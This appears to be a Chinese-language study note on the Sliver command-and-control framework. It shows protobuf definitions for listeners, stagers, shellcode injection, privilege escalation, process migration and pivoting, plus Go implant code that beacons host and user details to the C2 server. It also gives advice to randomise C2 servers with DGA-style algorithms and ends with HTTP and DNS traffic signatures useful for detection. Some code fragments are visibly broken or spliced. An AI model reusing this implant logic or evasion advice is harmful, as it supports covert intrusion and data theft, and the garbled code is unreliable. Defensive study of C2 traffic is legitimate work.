message Job {
  uint32 ID = 1;
  string Name = 2;
  string Description = 3;
  string Protocol = 4;
  uint32 Port = 5;
  repeated string Domains = 6;
}
// [ Jobs ]  ----------------------------------------
message Jobs {
  repeated Job Active = 1;
}
message KillJobReq {
  uint32 ID = 1;
}
message KillJob {
  uint32 ID = 1;
  bool Success = 2;
}
// [ Listeners ] ----------------------------------------
message MTLSListenerReq {
  string Host = 1;
  uint32 Port = 2;
  bool Persistent = 3;
}
message MTLSListener {
  uint32 JobID = 1;
}
message DNSListenerReq {
  repeated string Domains = 1;
  bool Canaries = 2;
  string Host = 3;
  uint32 Port = 4;
  bool Persistent = 5;
}
message DNSListener {
  uint32 JobID = 1;
}
message HTTPListenerReq {
  string Domain = 1;
  string Host = 2;
  uint32 Port = 3;
  bool Secure = 4; // Enable HTTPS
  string Website = 5;
  bytes Cert = 6;
  bytes Key = 7;
  bool ACME = 8;
  bool Persistent = 9;
}
// Named Pipes Messages for pivoting
message NamedPipesReq {
  string PipeName = 16;
  commonpb.Request Request = 9;
}
message NamedPipes {
  bool Success = 1;
  string Err = 2;
  commonpb.Response Response = 9;
}
// TCP Messages for pivoting
message TCPPivotReq {
  string Address = 16;
  commonpb.Request Request = 9;
}
message TCPPivot {
  bool Success = 1;
  string Err = 2;
  commonpb.Response Response = 9;
}
message HTTPListener {
  uint32 JobID = 1;
}
// [ commands ] ----------------------------------------
message Sessions {
  repeated Session Sessions = 1;
}
message UpdateSession {
  uint32 SessionID = 1;
  string Name = 2;
}
message GenerateReq {
  ImplantConfig Config = 1;
}
message Generate {
  commonpb.File File = 1;
}
message MSFReq {
  string Payload = 1;
  string LHost = 2;
  uint32 LPort = 3;
  string Encoder = 4;
  int32 Iterations = 5;
  commonpb.Request Request = 9;
}
message MSFRemoteReq {
  string Payload = 1;
  string LHost = 2;
  uint32 LPort = 3;
  string Encoder = 4;
  int32 Iterations = 5;
  uint32 PID = 8;
  commonpb.Request Request = 9;
}
enum StageProtocol {
    TCP = 0;
    HTTP = 1;
    HTTPS = 2;
}
message StagerListenerReq {
  StageProtocol Protocol = 1;
  string Host = 2;
  uint32 Port = 3;
  bytes Data = 4;
  bytes Cert = 5;
  bytes Key = 6;
  bool ACME = 7;
}
message StagerListener {
  uint32 JobID = 1;
}
message ShellcodeRDIReq {
  bytes Data = 1;
  string FunctionName = 2;
  string Arguments = 3;
}
message ShellcodeRDI {
  bytes Data = 1;
}
message MsfStagerReq {
  string Arch = 1;
  string Format = 2;
  uint32 Port = 3;
  string Host = 4;
  string OS = 5; // reserved for future usage
  StageProtocol Protocol = 6;
  repeated string BadChars = 7;
}
message MsfStager {
  commonpb.File File = 1;
}
// GetSystemReq - Client request to the server which is translated into
//                InvokeSystemReq when sending to the implant.
message GetSystemReq {
  string HostingProcess = 1;
  ImplantConfig Config = 2;
  commonpb.Request Request = 9;
}
// MigrateReq - Client request to the server which is translated into
//              InvokeMigrateReq when sending to the implant.
message MigrateReq {
  uint32 Pid = 1;
  ImplantConfig Config = 2;
  commonpb.Request Request = 9;
}
// [ Tunnels ] ----------------------------------------
message CreateTunnelReq {
  commonpb.Request Request = 9;
}
message CreateTunnel {
  uint32 SessionID = 1;
  uint64 TunnelID = 8 [jstype = JS_STRING];
}
message CloseTunnelReq {
  uint64 TunnelID = 8 [jstype = JS_STRING];
  commonpb.Request Request = 9;
}
// [ events ] ----------------------------------------
message Client {
  uint32 ID = 1;
  string Name = 2;
  Operator Operator = 3;
}
message Event {
  string EventType = 1;
  Session Session = 2;
  Job Job = 3;
  Client Client = 4;
  bytes Data = 5;
  string Err = 6; // Can't trigger normal gRPC error
}
message Operators { 
  repeated Operator Operators = 1;
}
message Operator {
  bool Online = 1;
  string Name = 2;
}
// [ websites ] ----------------------------------------
message WebContent {
  string Path = 1;
  string ContentType = 2;
  uint64 Size = 3 [jstype = JS_STRING];
  bytes Content = 9;
}
message WebsiteAddContent {
  string Name = 1;
  map Contents = 2;
}
message WebsiteRemoveContent { 
  string Name = 1;
  repeated string Paths = 2;
}
message Website {
  string Name = 1;
  map Contents = 2;
}
message Websites {
  repeated Website Websites = 1;
}
可学习的go编程
有很多Go编程的细节可以学习。
处理自定义协议
implant主函数很精简，先通过自定义协议连接，再一个主函数处理连接后的操作。
连接部分精简化的代码就是这样
for {
        connection := transports.StartConnectionLoop()
        if connection == nil {
            break
        }
        mainLoop(connection)
    }
nextCCServer可以通过连接的次数和server的数量变换协议和server
func nextCCServer() *url.URL {
    uri, err := url.Parse(ccServers[*ccCounter%len(ccServers)])
    *ccCounter++
    if err != nil {
        return nextCCServer()
    }
    return uri
}
后续通过解析出来的协议再分别处理。nextCCServer的算法有点简单，自己写的话可以修改一下，用一
些时间算法，dga算法等等，来达到随机化获取c2 teamserver的目的。
map映射函数
在接收任务进行处理的时候，通过map映射执行相关的函数
Goroutine 和 chanel 
使用chanel传递参数，使用goroutine创建处理过程
chanel创建完成后，想像server发送指令，只需要
即可
获取基础信息
send >",
得到信息后，直接通过发送到相关transport实现的send chan里
测试用例
用于工程化的一键生成、一键测试，详情可查看 _test.go 结尾的文件，这是个好习惯
流量特征
            Uid:      ">",
            Gid:      ">",
        }
    }
    filename, err := os.Executable()
    // Should not happen, but still...
    if err != nil {
        //TODO: build the absolute path to os.Args[0]
        if 0 >"
        }
    }
    // Retrieve UUID
    uuid := hostuuid.GetUUID()
    data, err := proto.Marshal(&sliverpb.Register{
        Name:              consts.SliverName,
        Hostname:          hostname,
        Uuid:              uuid,
        Username:          currentUser.Username,
        Uid:               currentUser.Uid,
        Gid:               currentUser.Gid,
        Os:                runtime.GOOS,
        Version:           version.GetVersion(),
        Arch:              runtime.GOARCH,
        Pid:               int32(os.Getpid()),
        Filename:          filename,
        ActiveC2:          transports.GetActiveC2(),
        ReconnectInterval: uint32(transports.GetReconnectInterval() / 
time.Second),
        ProxyURL:          transports.GetProxyURL(),
    })
    if err != nil {
        return nil
    }
    return &sliverpb.Envelope{
        Type: sliverpb.MsgRegister,
        Data: data,
    }
}
connection.Send <- getRegisterSliver()
http
获取公钥,访问 .txt 结尾
获取sessionid 会返回jsp结尾的uri
回显数据发送,以php结尾的uri
poll拉取请求,以访问 .js 结尾的uri
默认的UA以及请求流量
func (s *SliverHTTPClient) txtURL() string {
    curl, _ := url.Parse(s.Origin)
    segments := []string{"static", "www", "assets", "text", "docs", "sample"}
    filenames := []string{"robots.txt", "sample.txt", "info.txt", "example.txt"}
    curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
    return curl.String()
}
func (s *SliverHTTPClient) jspURL() string {
    curl, _ := url.Parse(s.Origin)
    segments := []string{"app", "admin", "upload", "actions", "api"}
    filenames := []string{"login.jsp", "admin.jsp", "session.jsp", "action.jsp"}
    curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
    return curl.String()
}
func (s *SliverHTTPClient) phpURL() string {
    curl, _ := url.Parse(s.Origin)
    segments := []string{"api", "rest", "drupal", "wordpress"}
    filenames := []string{"login.php", "signin.php", "api.php", "samples.php"}
    curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
    return curl.String()
}
func (s *SliverHTTPClient) jsURL() string {
    curl, _ := url.Parse(s.Origin)
    segments := []string{"js", "static", "assets", "dist", "javascript"}
    filenames := []string{"underscore.min.js", "jquery.min.js", 
"bootstrap.min.js"}
    curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
    return curl.String()
}
defaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) 
like Gecko"
req, _ := http.NewRequest(method, uri, body)
req.Header.Set("User-Agent", defaultUserAgent)
req.Header.Set("Accept-Language", "en-US")
query := req.URL.Query()
query.Set("_", fmt.Sprintf("%d", encoderNonce))
dns
对于一个域名有多个5级域名以上的DNS请求，或txt请求记录
一次完整的dns交互可能包含这些敏感DNS域名的字符串 _domainkey 、 .si 、 .se 、 .b